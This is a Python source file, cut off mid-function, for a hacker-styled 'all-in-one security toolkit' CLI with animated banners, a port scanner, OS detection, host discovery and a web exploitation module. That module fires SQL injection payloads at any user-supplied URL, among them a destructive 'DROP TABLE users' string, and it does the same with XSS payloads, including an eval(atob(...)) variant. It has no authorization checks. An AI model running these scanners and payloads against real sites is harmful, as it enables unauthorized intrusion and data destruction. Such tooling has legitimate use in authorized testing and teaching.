#!/usr/bin/env python3
"""
████████╗ █████╗ ███████╗██╗  ████████╗ █████╗ ███████╗██╗   ██╗ ████████╗ █████╗ ██╗  ██╗
╚══██╔══╝██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗██╔════╝██║   ██║ ╚══██╔══╝██╔══██╗╚██╗██╔╝
   ██║   ███████║███████╗██║     ██║   ███████║███████╗██║   ██║    ██║   ███████║ ╚███╔╝ 
   ██║   ██╔══██║╚════██║██║     ██║   ██╔══██║╚════██║██║   ██║    ██║   ██╔══██║ ██╔██╗ 
   ██║   ██║  ██║███████║██║     ██║   ██║  ██║███████║╚██████╔╝    ██║   ██║  ██║██╔╝ ██╗
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
                                                                                        
                    ▶ A L L - I N - O N E   S E C U R I T Y   T O O L K I T ◀
                              Self-Contained Intelligence v2.0
"""

import os
import sys
import time
import socket
import random
import threading
import subprocess
import platform
import hashlib
import base64
import json
import re
import urllib.request
import urllib.parse
import urllib.error
import struct
import ipaddress
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Any
from collections import deque
import itertools

# Import unified license system
try:
    from license import check_license, activate_license, get_license_info
    HAS_LICENSE = True
except ImportError:
    HAS_LICENSE = False

# Try to import optional modules
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.prompt import Prompt, Confirm
    from rich.text import Text
    from rich.layout import Layout
    from rich.style import Style
    from rich import box
    from rich.live import Live
    from rich.columns import Columns
    from rich.align import Align
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

try:
    import colorama
    from colorama import Fore, Back, Style as CStyle
    colorama.init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False

# ============================================================================
# COLOR SYSTEM
# ============================================================================

class Colors:
    """Fallback color system if rich/colorama not available"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    
    # Rainbow colors for animations
    RAINBOW = [
        '\033[38;5;196m',  # Red
        '\033[38;5;202m',  # Orange
        '\033[38;5;208m',  
        '\033[38;5;214m',  # Yellow
        '\033[38;5;190m',  
        '\033[38;5;154m',  # Green
        '\033[38;5;118m',  
        '\033[38;5;82m',   
        '\033[38;5;46m',   
        '\033[38;5;47m',   # Cyan
        '\033[38;5;51m',   
        '\033[38;5;45m',   # Blue
        '\033[38;5;39m',   
        '\033[38;5;93m',   # Purple
        '\033[38;5;129m',  
        '\033[38;5;165m',  # Pink
    ]
    
    @staticmethod
    def rainbow_text(text: str) -> str:
        """Apply rainbow colors to text"""
        result = ""
        for i, char in enumerate(text):
            color = Colors.RAINBOW[i % len(Colors.RAINBOW)]
            result += f"{color}{char}"
        return result + Colors.RESET

c = Colors()

# ============================================================================
# ANIMATION SYSTEM
# ============================================================================

class Animator:
    """Animation effects for CLI"""
    
    @staticmethod
    def typing_effect(text: str, delay: float = 0.02, color: str = None):
        """Typing animation effect"""
        for char in text:
            if color:
                print(f"{color}{char}{c.RESET}", end='', flush=True)
            else:
                print(char, end='', flush=True)
            time.sleep(delay)
        print()
        
    @staticmethod
    def loading_bar(length: int = 30, duration: float = 1.0, message: str = "Loading"):
        """Animated loading bar"""
        chars = ['█', '▓', '▒', '░']
        frames = int(duration * 20)
        
        for i in range(frames + 1):
            progress = i / frames
            filled = int(length * progress)
            empty = length - filled
            
            # Create gradient effect
            bar = ""
            for j in range(filled):
                bar += f"{c.GREEN}{chars[0]}{c.RESET}"
            for j in range(empty):
                bar += f"{c.DIM}{chars[3]}{c.RESET}"
                
            pct = int(progress * 100)
            print(f"\r{c.CYAN}{message}:{c.RESET} [{bar}] {pct}%", end='', flush=True)
            time.sleep(duration / frames)
        print()
        
    @staticmethod
    def spinner_animation(duration: float = 2.0, message: str = "Processing"):
        """Spinner animation"""
        spinners = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        colors = [c.RED, c.YELLOW, c.GREEN, c.CYAN, c.BLUE, c.MAGENTA]
        
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            color = colors[i % len(colors)]
            char = spinners[i % len(spinners)]
            print(f"\r{color}{char}{c.RESET} {message}...", end='', flush=True)
            time.sleep(0.1)
            i += 1
        print(f"\r{c.GREEN}✓{c.RESET} {message} complete!    ")
        
    @staticmethod
    def pulse_text(text: str, pulses: int = 3, color_on: str = c.GREEN, color_off: str = c.DIM):
        """Pulsing text animation"""
        for _ in range(pulses):
            for intensity in range(0, 101, 20):
                if intensity < 50:
                    print(f"\r{color_off}{text}{c.RESET}", end='', flush=True)
                else:
                    print(f"\r{color_on}{text}{c.RESET}", end='', flush=True)
                time.sleep(0.05)
        print()
        
    @staticmethod
    def matrix_rain(duration: float = 2.0, width: int = 80):
        """Matrix-style rain effect"""
        chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン'
        lines = [''] * 5
        
        end_time = time.time() + duration
        while time.time() < end_time:
            line = ''.join(random.choice(chars) for _ in range(width))
            color = random.choice([c.GREEN, c.CYAN, c.WHITE])
            print(f"{color}{line}{c.RESET}")
            time.sleep(0.1)
            
    @staticmethod
    def glitch_text(text: str, iterations: int = 10):
        """Glitch text effect"""
        glitch_chars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`'
        
        for _ in range(iterations):
            glitched = list(text)
            num_glitches = random.randint(1, len(text) // 3)
            for _ in range(num_glitches):
                pos = random.randint(0, len(glitched) - 1)
                glitched[pos] = random.choice(glitch_chars)
            print(f"\r{c.RED}{''.join(glitched)}{c.RESET}", end='', flush=True)
            time.sleep(0.05)
        print(f"\r{text}{c.RESET}")

animator = Animator()

# ============================================================================
# UI SYSTEM
# ============================================================================

class UI:
    """Advanced UI system with rich or fallback"""
    
    def __init__(self):
        self.console = Console() if HAS_RICH else None
        self.width = 80
        self.animation_enabled = True
        
    def clear(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def banner(self):
        """Display the main banner with animations"""
        self.clear()
        
        if self.animation_enabled:
            # Matrix rain intro
            print(f"{c.DIM}", end='')
            for _ in range(3):
                line = ''.join(random.choice('01') for _ in range(100))
                print(line)
                time.sleep(0.05)
            print(c.RESET, end='')
            
        if HAS_RICH:
            self._rich_banner()
        else:
            self._fallback_banner()
            
        if self.animation_enabled:
            # Pulse effect on title
            time.sleep(0.3)
            
    def _rich_banner(self):
        """Rich-based banner with advanced styling"""
        banner_text = """
________  _______    ______   __    __  __       __   ______  
|        \\|       \\  /      \\ |  \\  | \\|  \\     /  \\ /      \\ 
 \\$$$$$$$$| $$$$$$$\\|  $$$$$$\\| $$  | $$| $$\\   /  $$|  $$$$$$\\
   | $$   | $$__| $$| $$__| $$| $$  | $$| $$$\\ /  $$$| $$__| $$
   | $$   | $$    $$| $$    $$| $$  | $$| $$$$\\  $$$$| $$    $$
   | $$   | $$$$$$$\\| $$$$$$$$| $$  | $$| $$\\$$ $$ $$| $$$$$$$$
   | $$   | $$  | $$| $$  | $$| $$__/ $$| $$ \\$$$| $$| $$  | $$
   | $$   | $$  | $$| $$  | $$ \\$$    $$| $$  \\$ | $$| $$  | $$
    \\$$    \\$$   \\$$ \\$$   \\$$  \\$$$$$$  \\$$      \\$$ \\$$   \\$$
"""
        
        # Create animated panel
        self.console.print(Panel(
            f"[bold yellow]{banner_text}[/bold yellow]",
            border_style="red",
            box=box.DOUBLE,
            title="[blink cyan]▶ A L L - I N - O N E   S E C U R I T Y   T O O L K I T ◀[/blink cyan]",
            subtitle="[dim]Version 2.0.0 | Self-Contained Intelligence[/dim]",
            padding=(1, 2)
        ))
        
        # Animated stats bar
        stats = Table(show_header=False, box=None, expand=True)
        stats.add_column("", justify="center")
        
        modules = ["Network", "Web", "Password", "OSINT", "Wireless", "Payloads", "Forensics", "Anon"]
        stats_row = "  ".join([f"[green]●[/green] [cyan]{m}[/cyan]" for m in modules])
        stats.add_row(stats_row)
        self.console.print(stats)
        
        # Animated separator
        self.console.print("[dim]" + "─" * 100 + "[/dim]")
        self.console.print()
        
    def _fallback_banner(self):
        """Fallback banner without rich"""
        print(f"{c.RED}╔{'═' * 100}╗{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        
        banner_lines = [
            "████████╗ █████╗ ███████╗██╗  ████████╗ █████╗ ███████╗██╗   ██╗ ████████╗ █████╗ ██╗  ██╗",
            "╚══██╔══╝██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗██╔════╝██║   ██║ ╚══██╔══╝██╔══██╗╚██╗██╔╝",
            "   ██║   ███████║███████╗██║     ██║   ███████║███████╗██║   ██║    ██║   ███████║ ╚███╔╝ ",
            "   ██║   ██╔══██║╚════██║██║     ██║   ██╔══██║╚════██║██║   ██║    ██║   ██╔══██║ ██╔██╗ ",
            "   ██║   ██║  ██║███████║██║     ██║   ██║  ██║███████║╚██████╔╝    ██║   ██║  ██║██╔╝ ██╗",
            "   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝"
        ]
        
        for line in banner_lines:
            print(f"{c.RED}║     {c.BOLD}{c.YELLOW}{line}{c.RESET}     {c.RED}║{c.RESET}")
            
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}╠{'═' * 100}╣{c.RESET}")
        print(f"{c.RED}║       {c.CYAN}▶ A L L - I N - O N E   S E C U R I T Y   T O O L K I T ◀{c.RESET}                               {c.RED}║{c.RESET}")
        print(f"{c.RED}║       {c.DIM}Version 2.0.0 | Self-Contained Intelligence{c.RESET}                                 {c.RED}║{c.RESET}")
        print(f"{c.RED}╚{'═' * 100}╝{c.RESET}")
        
        # Module indicators
        modules = ["Network", "Web", "Password", "OSINT", "Wireless", "Payloads", "Forensics", "Anon"]
        print(f"\n{c.DIM}{'─' * 100}{c.RESET}")
        print(f"  {c.GREEN}●{c.RESET} Network   {c.GREEN}●{c.RESET} Web   {c.GREEN}●{c.RESET} Password   {c.GREEN}●{c.RESET} OSINT   {c.GREEN}●{c.RESET} Wireless   {c.GREEN}●{c.RESET} Payloads   {c.GREEN}●{c.RESET} Forensics   {c.GREEN}●{c.RESET} Anon")
        print()
        
    def menu(self, title: str, options: List[Tuple[str, str, str]]) -> str:
        """Display a menu and get user choice"""
        if HAS_RICH:
            return self._rich_menu(title, options)
        else:
            return self._fallback_menu(title, options)
            
    def _rich_menu(self, title: str, options: List[Tuple[str, str, str]]) -> str:
        """Rich-based menu with animations"""
        # Animated title
        self.console.print(f"\n[bold cyan]{'═' * 60}[/bold cyan]")
        self.console.print(Align.center(f"[bold magenta]{title}[/bold magenta]"))
        self.console.print(f"[bold cyan]{'═' * 60}[/bold cyan]\n")
        
        table = Table(
            show_header=True,
            header_style="bold yellow",
            border_style="red",
            box=box.DOUBLE,
            expand=True
        )
        table.add_column("╔═ Option ═╗", style="cyan", justify="center", width=12)
        table.add_column("╔═ Module ═╗", style="green", width=25)
        table.add_column("╔═ Description ═╗", style="white")
        
        for key, name, desc in options:
            # Color code based on type
            if key == "0":
                table.add_row(f"[bold red]{key}[/bold red]", f"[bold]{name}[/bold]", f"[dim]{desc}[/dim]")
            else:
                table.add_row(key, name, desc)
            
        self.console.print(table)
        
        return Prompt.ask(f"\n[bold yellow]⚡ Select option[/bold yellow]", default="0")
        
    def _fallback_menu(self, title: str, options: List[Tuple[str, str, str]]) -> str:
        """Fallback menu"""
        print(f"\n{c.BOLD}{c.CYAN}{'═' * 80}{c.RESET}")
        print(f"{c.BOLD}{c.MAGENTA}  {title}{c.RESET}")
        print(f"{c.BOLD}{c.CYAN}{'═' * 80}{c.RESET}")
        
        print(f"\n{c.RED}┌{'─' * 12}┬{'─' * 26}┬{'─' * 50}┐{c.RESET}")
        print(f"{c.RED}│{c.YELLOW}   Option   {c.RED}│{c.GREEN} Module                  {c.RED}│{c.WHITE} Description                                {c.RED}│{c.RESET}")
        print(f"{c.RED}├{'─' * 12}┼{'─' * 26}┼{'─' * 50}┤{c.RESET}")
        
        for key, name, desc in options:
            if key == "0":
                print(f"{c.RED}│{c.BOLD}{c.RED}     {key}      {c.RESET}{c.RED}│{c.BOLD}{name:<26}{c.RESET}{c.RED}│{c.DIM}{desc:<50}{c.RESET}{c.RED}│{c.RESET}")
            else:
                print(f"{c.RED}│{c.YELLOW}     {key}      {c.RED}│{c.GREEN} {name:<25} {c.RED}│{c.WHITE} {desc:<49} {c.RED}│{c.RESET}")
            
        print(f"{c.RED}└{'─' * 12}┴{'─' * 26}┴{'─' * 50}┘{c.RESET}")
        return input(f"\n{c.BOLD}{c.YELLOW}⚡ Select option: {c.RESET}")
        
    def success(self, msg: str):
        """Print success message with animation"""
        if HAS_RICH:
            self.console.print(f"[bold green]✓[/bold green] {msg}")
        else:
            print(f"{c.GREEN}✓ {msg}{c.RESET}")
            
    def error(self, msg: str):
        """Print error message"""
        if HAS_RICH:
            self.console.print(f"[bold red]✗[/bold red] {msg}")
        else:
            print(f"{c.RED}✗ {msg}{c.RESET}")
            
    def warning(self, msg: str):
        """Print warning message"""
        if HAS_RICH:
            self.console.print(f"[bold yellow]⚠[/bold yellow] {msg}")
        else:
            print(f"{c.YELLOW}⚠ {msg}{c.RESET}")
            
    def info(self, msg: str):
        """Print info message"""
        if HAS_RICH:
            self.console.print(f"[bold blue]ℹ[/bold blue] {msg}")
        else:
            print(f"{c.BLUE}ℹ {msg}{c.RESET}")
            
    def hacker(self, msg: str):
        """Print hacker-style message"""
        if HAS_RICH:
            self.console.print(f"[bold green]►[/bold green] [cyan]{msg}[/cyan]")
        else:
            print(f"{c.GREEN}► {c.CYAN}{msg}{c.RESET}")
            
    def progress(self, desc: str, total: int, iterable):
        """Progress bar for iterations"""
        if HAS_RICH:
            with Progress(
                SpinnerColumn(spinner_name="dots"),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(complete_style="green", finished_style="cyan"),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn()
            ) as progress:
                task = progress.add_task(desc, total=total)
                for item in iterable:
                    yield item
                    progress.update(task, advance=1)
        else:
            for i, item in enumerate(iterable):
                pct = int((i + 1) / total * 100)
                bar = '█' * (pct // 5) + '░' * (20 - pct // 5)
                print(f"\r{c.CYAN}{desc}{c.RESET} [{c.GREEN}{bar}{c.RESET}] {pct}%", end='', flush=True)
                yield item
            print()
            
    def table(self, title: str, headers: List[str], rows: List[List[str]]):
        """Display a table"""
        if HAS_RICH:
            table = Table(title=f"[bold cyan]{title}[/bold cyan]", border_style="red", box=box.DOUBLE)
            for header in headers:
                table.add_column(header, style="cyan")
            for row in rows:
                table.add_row(*[str(cell) for cell in row])
            self.console.print(table)
        else:
            print(f"\n{c.BOLD}{c.MAGENTA}  {title}{c.RESET}")
            col_widths = [max(len(str(row[i])) for row in [headers] + rows) for i in range(len(headers))]
            
            # Header
            header_line = "│".join(h.center(w + 2) for h, w in zip(headers, col_widths))
            print(f"{c.RED}┌{'─' * (len(header_line))}┐{c.RESET}")
            print(f"{c.RED}│{c.YELLOW}{header_line}{c.RED}│{c.RESET}")
            print(f"{c.RED}├{'─' * (len(header_line))}┤{c.RESET}")
            
            # Rows
            for row in rows:
                row_line = "│".join(str(cell).center(w + 2) for cell, w in zip(row, col_widths))
                print(f"{c.RED}│{c.WHITE}{row_line}{c.RED}│{c.RESET}")
                
            print(f"{c.RED}└{'─' * (len(header_line))}┘{c.RESET}")
            
    def box(self, title: str, content: str, style: str = "red"):
        """Display content in a box"""
        if HAS_RICH:
            self.console.print(Panel(content, title=title, border_style=style, box=box.DOUBLE))
        else:
            lines = content.split('\n')
            width = max(len(line) for line in lines) + 4
            print(f"{c.RED}┌{'─' * (width + 2)}┐{c.RESET}")
            print(f"{c.RED}│{c.YELLOW} {title.center(width)} {c.RED}│{c.RESET}")
            print(f"{c.RED}├{'─' * (width + 2)}┤{c.RESET}")
            for line in lines:
                print(f"{c.RED}│{c.WHITE} {line.ljust(width)} {c.RED}│{c.RESET}")
            print(f"{c.RED}└{'─' * (width + 2)}┘{c.RESET}")

ui = UI()

# ============================================================================
# NETWORK RECON MODULE
# ============================================================================

class NetworkRecon:
    """Network reconnaissance tools"""
    
    MODULE_NAME = "Network Recon"
    MODULE_DESC = "Port scanning, OS detection, service enumeration"
    
    @staticmethod
    def port_scanner():
        """Advanced port scanner with banner grabbing"""
        ui.clear()
        ui.banner()
        ui.hacker("PORT SCANNER - Scan target for open ports")
        
        target = input(f"\n{c.YELLOW}Enter target IP/hostname: {c.RESET}").strip()
        if not target:
            ui.error("No target specified")
            return
            
        # Resolve hostname
        try:
            ip = socket.gethostbyname(target)
            ui.success(f"Resolved {target} -> {ip}")
        except socket.gaierror:
            ui.error(f"Could not resolve {target}")
            return
            
        # Scan type selection
        print(f"\n{c.CYAN}Scan type:{c.RESET}")
        print(f"  {c.YELLOW}1.{c.RESET} Quick scan (common ports)")
        print(f"  {c.YELLOW}2.{c.RESET} Full scan (1-1024)")
        print(f"  {c.YELLOW}3.{c.RESET} Custom range")
        
        scan_type = input(f"{c.YELLOW}Select: {c.RESET}").strip() or "1"
        
        if scan_type == "1":
            # Common ports with service info
            common_ports = [
                (21, 'FTP', 'File Transfer'),
                (22, 'SSH', 'Secure Shell'),
                (23, 'Telnet', 'Remote Terminal'),
                (25, 'SMTP', 'Mail Server'),
                (53, 'DNS', 'Domain Name'),
                (80, 'HTTP', 'Web Server'),
                (110, 'POP3', 'Mail Protocol'),
                (135, 'RPC', 'Remote Procedure'),
                (139, 'NetBIOS', 'Windows Network'),
                (143, 'IMAP', 'Mail Protocol'),
                (443, 'HTTPS', 'Secure Web'),
                (445, 'SMB', 'Windows Share'),
                (993, 'IMAPS', 'Secure IMAP'),
                (995, 'POP3S', 'Secure POP3'),
                (1433, 'MSSQL', 'MS SQL Server'),
                (1521, 'Oracle', 'Oracle DB'),
                (3306, 'MySQL', 'MySQL DB'),
                (3389, 'RDP', 'Remote Desktop'),
                (5432, 'PostgreSQL', 'PostgreSQL DB'),
                (5900, 'VNC', 'Remote Desktop'),
                (6379, 'Redis', 'Cache DB'),
                (8080, 'HTTP-Alt', 'Alt Web'),
                (8443, 'HTTPS-Alt', 'Alt Secure Web'),
                (27017, 'MongoDB', 'Mongo DB'),
            ]
            ports_to_scan = common_ports
        elif scan_type == "2":
            ports_to_scan = [(p, f"Port {p}", "Unknown") for p in range(1, 1025)]
        else:
            start = int(input(f"{c.YELLOW}Start port: {c.RESET}") or "1")
            end = int(input(f"{c.YELLOW}End port: {c.RESET}") or "100")
            ports_to_scan = [(p, f"Port {p}", "Unknown") for p in range(start, end + 1)]
            
        ui.info(f"Scanning {len(ports_to_scan)} ports...")
        animator.spinner_animation(0.5, "Initializing scan")
        
        open_ports = []
        for port, service, desc in ui.progress("Scanning", len(ports_to_scan), ports_to_scan):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    banner = NetworkRecon._grab_banner(ip, port)
                    open_ports.append((port, service, desc, banner))
                sock.close()
            except:
                pass
                
        if open_ports:
            ui.success(f"Found {len(open_ports)} open ports")
            rows = [[str(p), s, d, b[:30] if b else 'N/A'] for p, s, d, b in open_ports]
            ui.table("Open Ports", ["Port", "Service", "Description", "Banner"], rows)
        else:
            ui.warning("No open ports found")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def _grab_banner(ip: str, port: int, timeout: float = 1) -> str:
        """Grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            
            # Try different probes based on port
            if port in [21, 25, 110, 143]:
                sock.send(b'\r\n')
            elif port in [80, 8080, 443, 8443]:
                sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            elif port == 22:
                pass  # SSH sends banner automatically
            else:
                sock.send(b'\r\n')
                
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner.split('\n')[0] if banner else ''
        except:
            return ''
            
    @staticmethod
    def os_detection():
        """OS detection via TTL and TCP fingerprinting"""
        ui.clear()
        ui.banner()
        ui.hacker("OS DETECTION - Detect operating system")
        
        target = input(f"\n{c.YELLOW}Enter target IP/hostname: {c.RESET}").strip()
        if not target:
            ui.error("No target specified")
            return
            
        animator.spinner_animation(1, "Probing target")
        
        # Ping to get TTL
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        try:
            result = subprocess.run(
                ['ping', param, '1', target],
                capture_output=True,
                text=True,
                timeout=10
            )
            output = result.stdout
            
            # Extract TTL
            ttl_match = re.search(r'TTL[=:]?\s*(\d+)', output, re.IGNORECASE)
            
            results = []
            
            if ttl_match:
                ttl = int(ttl_match.group(1))
                results.append(["TTL", str(ttl)])
                
                # OS detection based on TTL
                if ttl <= 64:
                    if ttl <= 32:
                        os_guess = "Linux/Unix (possibly behind firewall)"
                    else:
                        os_guess = "Linux/Unix"
                    results.append(["Likely OS", os_guess])
                    results.append(["OS Family", "Unix-like"])
                elif ttl <= 128:
                    if ttl >= 100:
                        os_guess = "Windows 10/11/Server"
                    elif ttl >= 64:
                        os_guess = "Windows 7/8/Server"
                    else:
                        os_guess = "Windows (possibly behind firewall)"
                    results.append(["Likely OS", os_guess])
                    results.append(["OS Family", "Windows"])
                elif ttl <= 255:
                    os_guess = "Cisco/Network Device"
                    results.append(["Likely OS", os_guess])
                    results.append(["OS Family", "Network Device"])
                else:
                    results.append(["Likely OS", "Unknown"])
                    
                # Additional checks
                results.append(["Ping Response", "Host is up"])
            else:
                results.append(["Status", "Host may be down or blocking ICMP"])
                
            ui.table("OS Detection Results", ["Property", "Value"], results)
            
        except subprocess.TimeoutExpired:
            ui.error("Ping timed out")
        except Exception as e:
            ui.error(f"Error: {e}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def network_mapper():
        """Network host discovery"""
        ui.clear()
        ui.banner()
        ui.hacker("NETWORK MAPPER - Discover hosts on network")
        
        # Get local IP to suggest network
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            base_ip = '.'.join(local_ip.split('.')[:-1])
            ui.info(f"Your IP: {local_ip}")
        except:
            base_ip = "192.168.1"
            
        user_base = input(f"\n{c.YELLOW}Enter base IP (default: {base_ip}): {c.RESET}").strip()
        if user_base:
            base_ip = user_base
            
        ui.info(f"Scanning {base_ip}.1-254...")
        animator.spinner_animation(0.5, "Initializing")
        
        alive_hosts = []
        lock = threading.Lock()
        
        def ping_host(ip):
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            try:
                result = subprocess.run(
                    ['ping', param, '1', '-w', '500' if platform.system().lower() == 'windows' else '1', ip],
                    capture_output=True,
                    timeout=1
                )
                if result.returncode == 0:
                    with lock:
                        alive_hosts.append(ip)
            except:
                pass
                
        threads = []
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            t = threading.Thread(target=ping_host, args=(ip,))
            t.daemon = True
            t.start()
            threads.append(t)
            
            # Limit concurrent threads
            if len(threads) >= 50:
                for t in threads:
                    t.join(timeout=0.1)
                threads = [t for t in threads if t.is_alive()]
                
        for t in threads:
            t.join()
            
        if alive_hosts:
            ui.success(f"Found {len(alive_hosts)} alive hosts")
            
            # Sort by last octet
            alive_hosts.sort(key=lambda x: int(x.split('.')[-1]))
            
            rows = []
            for ip in alive_hosts:
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "N/A"
                rows.append([ip, hostname, "Up"])
                
            ui.table("Alive Hosts", ["IP Address", "Hostname", "Status"], rows)
        else:
            ui.warning("No alive hosts found")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def ping_sweep():
        """Fast ping sweep"""
        ui.clear()
        ui.banner()
        ui.hacker("PING SWEEP - Fast network sweep")
        
        target = input(f"\n{c.YELLOW}Enter network (e.g., 192.168.1.0/24): {c.RESET}").strip()
        if not target:
            ui.error("No network specified")
            return
            
        try:
            network = ipaddress.ip_network(target, strict=False)
        except:
            ui.error("Invalid network format")
            return
            
        ui.info(f"Scanning {network.num_addresses - 2} hosts...")
        
        alive = []
        for ip in ui.progress("Sweeping", network.num_addresses - 2, list(network.hosts())):
            try:
                result = subprocess.run(
                    ['ping', '-n', '1', '-w', '100', str(ip)],
                    capture_output=True,
                    timeout=0.5
                )
                if result.returncode == 0:
                    alive.append(str(ip))
            except:
                pass
                
        if alive:
            ui.success(f"Found {len(alive)} hosts")
            for ip in alive:
                print(f"  {c.GREEN}●{c.RESET} {ip}")
        else:
            ui.warning("No hosts found")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# WEB EXPLOITATION MODULE
# ============================================================================

class WebExploit:
    """Web exploitation tools"""
    
    MODULE_NAME = "Web Exploitation"
    MODULE_DESC = "SQLi, XSS, Directory brute force, vulnerability scanning"
    
    @staticmethod
    def sqli_scanner():
        """SQL Injection vulnerability scanner"""
        ui.clear()
        ui.banner()
        ui.hacker("SQL INJECTION SCANNER")
        
        url = input(f"\n{c.YELLOW}Enter target URL (with parameter): {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        # SQLi payloads
        payloads = [
            ("Basic OR", "' OR '1'='1"),
            ("Comment", "' OR '1'='1'--"),
            ("MySQL Comment", "' OR '1'='1'#"),
            ("Double Quote", '" OR "1"="1'),
            ("Numeric", "' OR 1=1--"),
            ("UNION NULL", "1' UNION SELECT NULL--"),
            ("UNION Double", "1' UNION SELECT NULL,NULL--"),
            ("Error Based", "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"),
            ("Time Based", "'; WAITFOR DELAY '0:0:5'--"),
            ("Stacked", "1'; DROP TABLE users--"),
        ]
        
        error_patterns = [
            'sql', 'mysql', 'syntax', 'oracle', 'query', 'sqlite', 
            'postgresql', 'mariadb', 'odbc', 'jdbc', 'pdo',
            'error in your sql', 'warning', 'mysql_fetch', 
            'mysqli', 'pg_query', 'sqlite_query'
        ]
        
        vulnerable = []
        ui.info(f"Testing {len(payloads)} payloads...")
        
        for name, payload in ui.progress("Scanning", len(payloads), payloads):
            test_url = url + urllib.parse.quote(payload)
            try:
                req = urllib.request.Request(test_url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml'
                })
                response = urllib.request.urlopen(req, timeout=10)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                for pattern in error_patterns:
                    if pattern in content:
                        vulnerable.append((name, payload, pattern))
                        break
                        
            except urllib.error.HTTPError as e:
                if e.code in [500, 403]:
                    vulnerable.append((name, payload, f"HTTP {e.code}"))
            except:
                pass
                
        if vulnerable:
            ui.error("VULNERABLE: SQL Injection detected!")
            rows = [[n, p[:30], e] for n, p, e in vulnerable]
            ui.table("Vulnerabilities Found", ["Type", "Payload", "Evidence"], rows)
        else:
            ui.success("No SQLi vulnerabilities detected")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def xss_scanner():
        """XSS vulnerability scanner"""
        ui.clear()
        ui.banner()
        ui.hacker("XSS SCANNER")
        
        url = input(f"\n{c.YELLOW}Enter target URL (with parameter): {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        payloads = [
            ("Basic Script", "<script>alert('XSS')</script>"),
            ("Img Tag", "<img src=x onerror=alert('XSS')>"),
            ("SVG Tag", "<svg onload=alert('XSS')>"),
            ("Body Tag", "<body onload=alert('XSS')>"),
            ("Input Tag", "<input onfocus=alert('XSS') autofocus>"),
            ("Iframe", "<iframe src='javascript:alert(1)'>"),
            ("Details", "<details open ontoggle=alert('XSS')>"),
            ("Anchor", "<a href='javascript:alert(1)'>click</a>"),
            ("Single Quote", "'><script>alert('XSS')</script>"),
            ("Double Quote", "\"><script>alert('XSS')</script>"),
            ("Event Handler", "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">"),
        ]
        
        vulnerable = []
        ui.info(f"Testing {len(payloads)} payloads...")
        
        for name, payload in ui.progress("Scanning", len(payloads), payloads):
            test_url = url + urllib.parse.quote(payload)
            try:
                req = urllib.request.Request(test_url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                response = urllib.request.urlopen(req, timeout=10)
                content = response.read().decode('utf-8', errors='ignore')
                
                # Check if payload is reflected
                if payload in content or payload.replace('&lt;', '<').replace('&gt;', '>') in content:
                    vulnerable.append((name, payload[:40], "Reflected"))
                    
            except:
                pass
                
        if vulnerable:
            ui.error("VULNERABLE: XSS detected!")
            rows = [[n, p, e] for n, p, e in vulnerable]
